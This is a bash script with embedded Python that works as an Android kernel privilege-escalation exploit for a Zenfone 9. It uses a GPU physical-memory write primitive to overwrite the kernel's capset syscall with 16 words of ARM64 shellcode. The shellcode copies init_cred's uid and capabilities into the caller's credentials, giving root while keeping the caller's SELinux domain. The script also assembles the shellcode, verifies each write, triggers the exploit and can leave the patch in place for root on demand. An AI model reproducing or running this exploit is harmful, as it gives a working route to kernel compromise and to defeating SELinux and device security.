#!/usr/bin/env bash
# root-cred.sh — root that is USABLE: keep our own SELinux domain, take init_cred's uid+caps.
#
# Why (round 8 root cause):
#   The round-6/7 patch tail-called commit_creds(&init_cred). That gives uid 0 AND init_cred's
#   SELinux SID, i.e. the process lands in the *kernel* domain, where almost every userspace
#   operation is denied (kallsyms, /data/local/tmp, /sdcard, /dev/kgsl-3d0, execve, init_module).
#   Root was real but useless.
#
# Fix: build a cred of our OWN with prepare_creds() (=> our trusty "shell" SID is preserved, since
#   SELinux keeps the same task_security_struct) and copy only the *uid + caps* region out of
#   init_cred. In struct cred that region is contiguous and low (uids at +0x04..+0x23, securebits
#   +0x24, cap_inheritable/.../+cap_ambient at +0x28..+0x4f), while the SID pointer `security` sits
#   at the very end of the struct - so a 0x4c-byte copy from init_cred+4 cannot touch it.
#
# Shellcode (16 dwords, staged IN PLACE at __do_sys_capset; that syscall is cold - nothing in
# Android calls capset - and the proven 3-dword P1 patch already overwrote this same entry):
#   stp x29,x30,[sp,#-0x20]!      save our return address (bl clobbers x30)
#   str x19,[sp,#0x10]
#   bl  prepare_creds             x0 = copy of OUR cred (our SID)
#   cbz x0, epilogue
#   mov x19,x0
#   add x0,x19,#4                 dst = our_cred + 4
#   adrp x1,<init_cred page>      src = &init_cred + 4
#   add x1,x1,#0xae4
#   mov w2,#0x4c                  len = uids + securebits + all five cap sets
#   bl  memcpy
#   mov x0,x19
#   bl  commit_creds              install it
#   mov w0,wzr / ldr x19 / ldp / ret   -> capset() returns 0
#
# Every encoding is PC-relative, so the patch is identical on every boot: no slide read, no
# runtime literals, no code cave, and only 16 GPU writes.
set -u
DIR=$(cd "$(dirname "$0")" && pwd)
[ -f "$DIR/../device.env" ] && . "$DIR/../device.env"
S=${ZF9_SERIAL:?set ZF9_SERIAL (or create device.env)}
STAMP=$(date +%Y%m%d-%H%M%S)
LOG=$HOME/Dev/zenfone9-root/logs/cred-$STAMP; mkdir -p "$LOG"
PATCH_ADDR=0xa8145af0          # __do_sys_capset
KEEP=${KEEP:-0}                # KEEP=1 leaves the patch in place => root on demand

adb_s() { adb -s "$S" shell "$1" </dev/null 2>&1 | tr -d '\r'; }
rd() { adb_s "CHEESE_PROBE_ONLY=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=$1 timeout 120 /data/local/tmp/cheese_pa > /data/local/tmp/rc.txt 2>&1; grep -o 'value=0x[0-9a-f]*' /data/local/tmp/rc.txt | head -1" | sed 's/value=//'; }
wr() { adb_s "CHEESE_POKE=1 CHEESE_NO_RETRY=1 CHEESE_TARGET_PA=$1 CHEESE_WRITE_PA=$1 CHEESE_WRITE_VAL=$2 timeout 240 /data/local/tmp/cheese_pa > /data/local/tmp/rc.txt 2>&1; grep -o 'POKE write.*' /data/local/tmp/rc.txt"; }

anim_on() {
    adb -s "$S" push "$DIR/../src/anim.sh" /data/local/tmp/anim.sh </dev/null >/dev/null 2>&1
    adb_s 'chmod 755 /data/local/tmp/anim.sh; svc power stayon true' >/dev/null
    adb_s 'input keyevent KEYCODE_WAKEUP; wm dismiss-keyguard' >/dev/null
    adb_s 'nohup sh /data/local/tmp/anim.sh >/dev/null 2>&1 &' >/dev/null
    sleep 4
    local n; n=$(adb_s 'pgrep -f anim.sh | wc -l')
    [ "${n:-0}" -ge 1 ] || { echo "[cred] FATAL: GPU animation not alive"; return 1; }
    echo "[cred] animation alive ($n), $(adb_s 'dumpsys power | grep -m1 mWakefulness=')"
}
anim_off() { adb_s 'pkill -f anim.sh; svc power stayon false' >/dev/null 2>&1; }

wr_verified() {
    local a=$1 v=$2 got i
    got=$(rd "$a")
    [ "$got" = "$v" ] && { echo "  $a already $v"; return 0; }
    for i in 1 2 3; do
        wr "$a" "$v" >/dev/null
        sleep 2
        got=$(rd "$a")
        [ "$got" = "$v" ] && { echo "  $a <- $v VERIFIED"; return 0; }
        echo "  attempt $i at $a: read back $got"
    done
    echo "  $a <- $v FAILED (read back $got)" >&2
    return 1
}

restore() {
    echo "[cred] restoring original capset text"
    anim_on >/dev/null 2>&1 || true
    local i a
    for i in $(seq 0 15); do
        a=$(printf '0x%x' $((PATCH_ADDR + 4 * i)))
        wr_verified "$a" "$(printf '0x%08x' "${ORIG[$i]}")" >/dev/null 2>&1 || echo "  restore[$i] $a unverified"
    done
    echo "[cred] capset[0]=$(rd $PATCH_ADDR) (want 0xd503233f)  selinux=$(adb_s getenforce)"
    anim_off
}
trap restore EXIT INT TERM

# --- the shellcode -----------------------------------------------------------
SC=$(python3 - <<'PY'
SITE  = 0xffffffc008145af0   # __do_sys_capset (link-time VA; +slide cancels out everywhere)
PREP  = 0xffffffc008184580   # prepare_creds
MEMCPY= 0xffffffc00801f680   # memcpy
COMMIT= 0xffffffc008184c94   # commit_creds
IC    = 0xffffffc00a7b0ae0   # init_cred
def bl(t, pc):
    d = (t - pc) >> 2
    assert -(1 << 25) <= d < (1 << 25), 'bl out of range'
    return 0x94000000 | (d & 0x03ffffff)
def adrp(rd, t, pc):
    imm = ((t & ~0xfff) - (pc & ~0xfff)) >> 12
    return 0x90000000 | ((imm & 3) << 29) | (((imm >> 2) & 0x7ffff) << 5) | rd
def addi(rd, rn, i): return 0x91000000 | ((i & 0xfff) << 10) | (rn << 5) | rd
def cbz(rt, words):  return 0xb4000000 | ((words & 0x7ffff) << 5) | rt
w = []
w.append(0xa9be7bfd)                    # 0  stp x29,x30,[sp,#-0x20]!
w.append(0xf9000bf3)                    # 1  str x19,[sp,#0x10]
w.append(bl(PREP, SITE + 4*2))          # 2  bl prepare_creds
w.append(cbz(0, 10))                    # 3  cbz x0, epilogue (= word 13)
w.append(0xaa0003f3)                    # 4  mov x19,x0
w.append(addi(0, 19, 4))                # 5  add x0,x19,#4
w.append(adrp(1, IC, SITE + 4*6))       # 6  adrp x1, page(init_cred)
w.append(addi(1, 1, (IC + 4) & 0xfff))  # 7  add x1,x1,#0xae4
w.append(0x52800982)                    # 8  mov w2,#0x4c
w.append(bl(MEMCPY, SITE + 4*9))        # 9  bl memcpy
w.append(0xaa1303e0)                    # 10 mov x0,x19
w.append(bl(COMMIT, SITE + 4*11))       # 11 bl commit_creds
w.append(0x2a1f03e0)                    # 12 mov w0,wzr
w.append(0xf9400bf3)                    # 13 ldr x19,[sp,#0x10]
w.append(0xa8c27bfd)                    # 14 ldp x29,x30,[sp],#0x20
w.append(0xd65f03c0)                    # 15 ret
assert len(w) == 16
print(' '.join('%08x' % x for x in w))
PY
)
SC=${SC:-}
[ -n "$SC" ] || { echo "[cred] shellcode assembly failed"; exit 1; }
echo "[cred] shellcode ($(echo $SC | wc -w) dwords): $SC"

# original 16 dwords of __do_sys_capset (text == image, so these are stable)
ORIG=(d503233f d10203ff f800865e a9047bfd a9055ff8 a90657f6 a9074ff4 910103fd \
      90010d28 f9448908 aa0103f4 910073e1 aa0003f5 f81f83a8 a902ffff f90013ff)

up=$(adb_s 'cut -d. -f1 /proc/uptime')
if [ "${up:-0}" -lt 180 ]; then
    echo "[cred] waiting for the device to settle"
    while [ "$(adb_s 'cut -d. -f1 /proc/uptime')" -lt 180 ]; do sleep 10; done
fi
echo "[cred] uptime $(adb_s 'cut -d. -f1 /proc/uptime')s  selinux=$(adb_s getenforce)"
echo "[cred] capset entry before: $(rd $PATCH_ADDR) (want 0xd503233f)"

anim_on || exit 1

echo "[cred] staging 16 dwords at capset entry (one GPU op per process)"
i=0
for v in $SC; do
    wr_verified "$(printf '0x%x' $((PATCH_ADDR + 4 * i)))" "0x$v" || { echo "[cred] patch incomplete at dword $i"; exit 1; }
    i=$((i + 1))
done
echo "[cred] full-patch check (fresh-process reads):"
i=0; bad=0
for v in $SC; do
    got=$(rd "$(printf '0x%x' $((PATCH_ADDR + 4 * i)))")
    [ "$got" = "0x$v" ] || { echo "  dword $i = $got (want 0x$v)"; bad=$((bad+1)); }
    i=$((i + 1))
done
[ "$bad" = 0 ] && echo "  all 16 dwords confirmed" || { echo "[cred] $bad dwords wrong -> aborting"; exit 1; }

echo "[cred] === TRIGGER (fresh process) ==="
adb -s "$S" shell "/data/local/tmp/call_capset" </dev/null 2>&1 | tee "$LOG/root.txt" | tail -30

[ "$KEEP" = 1 ] && { echo "[cred] KEEP=1 -> leaving patch in place (root on demand: run call_capset)"; exit 0; }
restore
trap - EXIT INT TERM
echo "[cred] logdir: $LOG"
